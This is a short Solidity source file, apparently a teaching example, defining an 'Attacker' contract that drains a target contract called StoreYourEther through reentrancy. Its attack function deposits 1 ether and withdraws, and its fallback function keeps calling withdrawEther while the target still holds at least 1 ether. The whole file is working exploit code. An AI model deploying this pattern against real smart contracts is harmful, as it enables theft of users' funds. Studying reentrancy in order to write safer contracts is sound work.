//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;
import "./StoreYourEther.sol";

contract Attacker {
    StoreYourEther public storeYourEther;

    constructor(address _etherStoreAddress) {
        storeYourEther = StoreYourEther(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(storeYourEther).balance >= 1 ether) {
            storeYourEther.withdrawEther();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        storeYourEther.depositEther{value: 1 ether}();
        storeYourEther.withdrawEther();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
